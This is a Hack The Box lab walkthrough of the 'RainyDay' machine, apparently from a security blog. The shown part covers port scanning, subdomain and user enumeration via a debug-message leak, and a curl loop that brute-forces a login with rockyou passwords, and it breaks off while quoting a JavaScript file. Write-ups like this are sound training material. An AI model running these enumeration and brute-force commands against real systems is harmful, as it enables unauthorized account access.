<!doctype html><html lang="en"><head><title>RainyDay | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="Hack The Box. Linux. Hard machine. This machine has a website vulnerable to user enumeration. Then we can use brute force a user&rsquo;s password and run containers. Using a container we can access an internal website that has an API that shows sensitive information using Type Juggling and has a feature for matching regular expressions on given files, so that we can read source code and get the secret key for Flask. Then, we can forge a session for user jack and find out that the Docker containers allow to access process information from the machine, and we can read the private SSH key of this user. Next, we can run a custom Python interpreter and escape the sandbox to get a shell as jack_adm. Finally, we have a tool to generate hashes with bcrypt, and we need to exploit a limitation of bcrypt to extract a secret pepper string and then crack root&rsquo;s hash in order to escalate privileges"><meta name="image" content="https://7rocky.github.io/images/HTB/RainyDay/RainyDay.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Hard machine. This machine has a website vulnerable to user enumeration. Then we can use brute force a user&rsquo;s password and run containers. Using a container we can access an internal website that has an API that shows sensitive information using Type Juggling and has a feature for matching regular expressions on given files, so that we can read source code and get the secret key for Flask. Then, we can forge a session for user jack and find out that the Docker containers allow to access process information from the machine, and we can read the private SSH key of this user. Next, we can run a custom Python interpreter and escape the sandbox to get a shell as jack_adm. Finally, we have a tool to generate hashes with bcrypt, and we need to exploit a limitation of bcrypt to extract a secret pepper string and then crack root&rsquo;s hash in order to escalate privileges"><meta itemprop="keywords" content="api,flask,docker,python,sudo,crypto,type-juggling,port-forwarding,file-permissions,sandbox-escape,user-enumeration,hash-cracking,"><meta itemprop="name" content="RainyDay"><meta property="article:published_time" content="2023-02-18T00:00:00+00:00"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="Hack The Box. Linux. Hard machine. This machine has a website vulnerable to user enumeration. Then we can use brute force a user&rsquo;s password and run containers. Using a container we can access an internal website that has an API that shows sensitive information using Type Juggling and has a feature for matching regular expressions on given files, so that we can read source code and get the secret key for Flask. Then, we can forge a session for user jack and find out that the Docker containers allow to access process information from the machine, and we can read the private SSH key of this user. Next, we can run a custom Python interpreter and escape the sandbox to get a shell as jack_adm. Finally, we have a tool to generate hashes with bcrypt, and we need to exploit a limitation of bcrypt to extract a secret pepper string and then crack root&rsquo;s hash in order to escalate privileges"><meta property="og:image" content="https://7rocky.github.io/images/HTB/RainyDay/RainyDay.webp"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="RainyDay"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/en/htb/rainyday/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="Hack The Box. Linux. Hard machine. This machine has a website vulnerable to user enumeration. Then we can use brute force a user&rsquo;s password and run containers. Using a container we can access an internal website that has an API that shows sensitive information using Type Juggling and has a feature for matching regular expressions on given files, so that we can read source code and get the secret key for Flask. Then, we can forge a session for user jack and find out that the Docker containers allow to access process information from the machine, and we can read the private SSH key of this user. Next, we can run a custom Python interpreter and escape the sandbox to get a shell as jack_adm. Finally, we have a tool to generate hashes with bcrypt, and we need to exploit a limitation of bcrypt to extract a secret pepper string and then crack root&rsquo;s hash in order to escalate privileges"><meta name="twitter:description" content="Hack The Box. Linux. Hard machine. This machine has a website vulnerable to user enumeration. Then we can use brute force a user&rsquo;s password and run containers. Using a container we can access an internal website that has an API that shows sensitive information using Type Juggling and has a feature for matching regular expressions on given files, so that we can read source code and get the secret key for Flask. Then, we can forge a session for user jack and find out that the Docker containers allow to access process information from the machine, and we can read the private SSH key of this user. Next, we can run a custom Python interpreter and escape the sandbox to get a shell as jack_adm. Finally, we have a tool to generate hashes with bcrypt, and we need to exploit a limitation of bcrypt to extract a secret pepper string and then crack root&rsquo;s hash in order to escalate privileges"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/RainyDay/RainyDay.webp"><meta name="twitter:title" content="RainyDay"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/htb/rainyday/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/rainyday/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/rainyday/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/rainyday/&amp;text=RainyDay" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/htb/rainyday/&amp;title=RainyDay" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">RainyDay</h1><time class="mt4 f6 dib tracked" datetime="2023-02-18T00:00:00+01:00">18 / 02 / 2023</time><br><p class="mb4 f6 dib tracked">25 minutes to read</p></header><div class="htb-image"><img alt="RainyDay" src="/images/HTB/RainyDay/RainyDay.webp"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/api" title="API">API</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/flask" title="Flask">Flask</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/docker" title="Docker">Docker</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/python" title="Python">Python</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/sudo" title="<code>sudo</code>"><code>sudo</code></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/crypto" title="Cryptography">Cryptography</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/type-juggling" title="Type Juggling">Type Juggling</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/port-forwarding" title="Port forwarding">Port forwarding</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/file-permissions" title="File permissions">File permissions</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/sandbox-escape" title="Sandbox escape">Sandbox escape</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/user-enumeration" title="User enumeration">User enumeration</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/hash-cracking" title="Password hash cracking">Password hash cracking</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a><ul><li><a href="#user-enumeration">User enumeration</a></li><li><a href="#brute-force-attack">Brute force attack</a></li><li><a href="#javascript-file-enumeration">JavaScript file enumeration</a></li><li><a href="#container-enumeration">Container enumeration</a></li><li><a href="#accessing-the-development-environment">Accessing the development environment</a></li><li><a href="#api-enumeration">API enumeration</a></li></ul></li><li><a href="#foothold">Foothold</a><ul><li><a href="#reading-files-from-the-server">Reading files from the server</a></li><li><a href="#accessing-jacks-container">Accessing <code>jack</code>&rsquo;s container</a></li><li><a href="#access-via-ssh">Access via SSH</a></li></ul></li><li><a href="#lateral-movement-to-user-jack_adm">Lateral movement to user <code>jack_adm</code></a><ul><li><a href="#escaping-python-sandbox">Escaping Python sandbox</a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#finding-the-secret-pepper">Finding the secret pepper</a></li><li><a href="#cracking-roots-hash">Cracking <code>root</code>&rsquo;s hash</a></li></ul></li><li><a href="#clarifications">Clarifications</a><ul><li><a href="#api-type-juggling">API Type Juggling</a></li><li><a href="#user-enumeration-1">User enumeration</a></li><li><a href="#process-inspection-from-the-containers">Process inspection from the containers</a></li><li><a href="#ip-address-validation">IP address validation</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Hard</li><li><strong>IP Address</strong>: 10.10.11.184</li><li><strong>Release</strong>: 15 / 10 / 2022</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.184 -p 22,80
Nmap scan report for 10.10.11.184
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 48dde361dc5d5878f881dd6172fe6581 (ECDSA)
|_  256 adbf0bc8520f49a9a0ac682a2525cd6d (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://rainycloud.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 8.22 seconds
</code></pre></div><p>This machine has ports 22 (SSH) and 80 (HTTP) open.</p><h2 id="enumeration">Enumeration</h2><p>If we go to <code>http://10.10.11.184</code>, we will be redirected to <code>http://rainycloud.htb</code>. After setting the domain in <code>/etc/hosts</code>, we see this webpage:</p><p><img alt="RainyDay 1" src="/images/HTB/RainyDay/RainyDay-1.webp"></p><p>First of all, we can enumerate more subdomains using <code>ffuf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.184 -H <span class="code-dark-yellow">'Host: FUZZ.rainycloud.htb'</span> -fs 229  
<span class="code-dark-yellow">dev                     [Status: 403, Size: 26, Words: 5, Lines: 1, Duration: 411ms]</span>
</code></pre></div><p>And there we have <code>dev.rainycloud.htb</code>, but we are not allowed to access:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -i dev.rainycloud.htb
HTTP/1.1 403 FORBIDDEN
<span class="code-white">Server</span>: nginx/1.18.0 (Ubuntu)
<span class="code-white">Date</span>:
<span class="code-white">Content-Type</span>: text/html; charset=utf-8  
<span class="code-white">Content-Length</span>: 26
<span class="code-white">Connection</span>: keep-alive

Access Denied - Invalid IP
</code></pre></div><p>From here, we can see that the web technology behind nginx is Flask, because the response status message is in capital letters. Moreover, we cannot bypass the IP check using <code>X-Forwarded-For</code> header or similar headers. So this is a dead end for the moment.</p><p>In the main website, we have <code>jack</code> as username. We will need to login to use the web application:</p><p><img alt="RainyDay 2" src="/images/HTB/RainyDay/RainyDay-2.webp"></p><p>But it will be nice to register first:</p><p><img alt="RainyDay 3" src="/images/HTB/RainyDay/RainyDay-3.webp"></p><p>But registration is closed&mldr;</p><p><img alt="RainyDay 4" src="/images/HTB/RainyDay/RainyDay-4.webp"></p><h3 id="user-enumeration">User enumeration</h3><p>Looking at the HTML code of <code>/login</code>, there is a debug message that leaks a source file path:</p><p><img alt="RainyDay 5" src="/images/HTB/RainyDay/RainyDay-5.webp"></p><p>In fact, <code>288</code> is the line of code where the program has failed. Surprisingly, if we use <code>jack</code> as username to login, we see <code>294</code> in the debug message:</p><p><img alt="RainyDay 6" src="/images/HTB/RainyDay/RainyDay-6.webp"></p><p>So here we have a way to enumerate users. Let&rsquo;s use <code>ffuf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/names.txt -u http://rainycloud.htb/login -d <span class="code-dark-yellow">'username=FUZZ&password=asdf'</span> -H <span class="code-dark-yellow">'Content-Type: application/x-www-form-urlencoded'</span> -mr 294  
<span class="code-dark-green">gary                    [Status: 200, Size: 3488, Words: 1270, Lines: 66, Duration: 1351ms]</span>
<span class="code-dark-green">jack                    [Status: 200, Size: 3488, Words: 1270, Lines: 66, Duration: 490ms]</span>
<span class="code-dark-green">root                    [Status: 200, Size: 3488, Words: 1270, Lines: 66, Duration: 226ms]</span>
</code></pre></div><p>So we have 3 available users.</p><h3 id="brute-force-attack">Brute force attack</h3><p>In order to have some recognition in background, I guessed that <code>gary</code> had a weak password, so I did a brute force attack using the first passwords in <code>rockyou.txt</code> until I found a successful login:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> p in <span class="code-dark-magenta">$(</span><span class="code-dark-green">head</span> -10000 $WORDLISTS/rockyou.txt<span class="code-dark-magenta">)</span>; <span class="code-dark-yellow">do</span> <span class="code-dark-green">curl</span> rainycloud.htb/login -sd <span class="code-dark-yellow">"username=gary&password=<span class="code-dark-cyan">$p</span>"</span> | <span class="code-dark-green">md5sum</span> | <span class="code-dark-green">tr</span> \\n <span class="code-dark-yellow">' '</span>; <span class="code-dark-green">echo</span> $p; <span class="code-dark-yellow">done</span> | <span class="code-dark-green">grep</span> -v 225c68dfe55778812b201bd4cf01fbd5  
0aff13952610be440befcb31a31a4c3f  - rubberducky
</code></pre></div><p>Unexpectedly, after more than an hour, I found that <code>rubberducky</code> was the password for <code>gary</code>.</p><p>Notice that I used the MD5 hash of the response to determine the one that was successful.</p><h3 id="javascript-file-enumeration">JavaScript file enumeration</h3><p>While waiting for the brute force attack to complete, I enumerated web routes and JavaScript files using <code>ffuf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://rainycloud.htb/FUZZ
<span class="code-dark-green">login                   [Status: 200, Size: 3254, Words: 1158, Lines: 63, Duration: 67ms]</span>
<span class="code-dark-blue">new                     [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 109ms]</span>
<span class="code-dark-green">register                [Status: 200, Size: 3686, Words: 1324, Lines: 68, Duration: 67ms]</span>
<span class="code-dark-blue">logout                  [Status: 302, Size: 189, Words: 18, Lines: 6, Duration: 53ms]</span>
<span class="code-dark-green">                        [Status: 200, Size: 4378, Words: 1045, Lines: 110, Duration: 302ms]</span>
<span class="code-dark-blue">containers              [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 259ms]</span>

<span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://rainycloud.htb/js/FUZZ.js  
<span class="code-dark-green">signup                  [Status: 200, Size: 259, Words: 58, Lines: 12, Duration: 59ms]</span>
<span class="code-dark-green">containers              [Status: 200, Size: 1606, Words: 437, Lines: 51, Duration: 182ms]</span>
</code></pre></div><p>The only interesting file is <code>containers.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">saveBlob</span><span class="mtk1">(</span><span class="mtk9 mtki">blob</span><span class="mtk1">, </span><span class="mtk9 mtki">fileName</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">var</span><span class="mtk1"> </span><span class="mtk1">a</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">document</span><span class="mtk1">.</span><span class="mtk8">createElement</span><span class="mtk1">(</span><span class="mtk4">'a'</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk1">a</span><span class="mtk1">.</span><span class="mtk1">href</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">window</span><span class="mtk1">.</span><span class="mtk7 mtki">URL</span><span class="mtk1">.</span><span class="mtk8">createObjectURL</span><span class="mtk1">(</span><span class="mtk9 mtki">blob</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk1">a</span><span class="mtk1">.</span><span class="mtk1">download</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">fileName</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk1">a</span><span class="mtk1">.</span><span class="mtk8">dispatchEvent</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">MouseEvent</span><span class="mtk1">(</span><span class="mtk4">'click'</span><span class="mtk1">));</span>
<span class="mtk1">}</span>

<span class="mtk3">// RainyCloud-1: TODO - Implement REST API sensibl</span><span class="mtk3">y (this is dumb!)</span>
<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">action</span><span class="mtk1">(</span><span class="mtk9 mtki">action_name</span><span class="mtk1">, </span><span class="mtk9 mtki">container_id</span><span class="mtk1">, </span><span class="mtk9 mtki">ctx</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk9 mtki">ctx</span><span class="mtk1">.disabled </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">xhr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">XMLHttpRequest</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk1">xhr</span><span class="mtk1">.</span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"POST"</span><span class="mtk1">, </span><span class="mtk4">"/containers"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk1">xhr</span><span class="mtk1">.</span><span class="mtk8">setRequestHeader</span><span class="mtk1">(</span><span class="mtk4">'Content-type'</span><span class="mtk1">, </span><span class="mtk4">'application/x-www-form-urlencoded'</span><span class="mtk1">);</span>
<span class="mtk1">    data </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk4">"action"</span><span class="mtk1">: </span><span class="mtk9 mtki">action_name</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">"id"</span><span class="mtk1">: </span><span class="mtk9 mtki">container_id</span>
<span class="mtk1">    }</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">action_name</span><span class="mtk1"> </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">"logs"</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk9 mtki">action_name</span><span class="mtk1">.</span><span class="mtk8">startsWith</span><span class="mtk1">(</span><span class="mtk4">"exec"</span><span class="mtk1">)) {</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">action_name</span><span class="mtk1">.</span><span class="mtk8">startsWith</span><span class="mtk1">(</span><span class="mtk4">"exec"</span><span class="mtk1">))</span>
<span class="mtk1">        {</span>
